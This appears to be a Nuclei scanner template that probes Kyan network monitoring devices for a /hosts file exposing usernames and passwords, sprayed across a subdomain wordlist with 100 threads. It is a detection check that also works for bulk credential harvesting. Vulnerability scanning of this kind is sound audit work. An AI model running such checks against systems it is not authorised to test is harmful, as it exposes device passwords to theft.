id: kyan-network-credential-exposure
info:
  author: pikpikcu
  name: Kyan network monitoring device account and password exposure
  reference: '- https://mp.weixin.qq.com/s/6phWjDrGG0pCpGuCdLusIg

    '
  severity: medium
  tags: kyan,exposure,config
requests:
- attack: sniper
  matchers:
  - condition: and
    type: word
    words:
    - UserName=
    - Password=
  - part: header
    type: word
    words:
    - text/plain
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /hosts HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
    Firefox/55

    '
  threads: 100
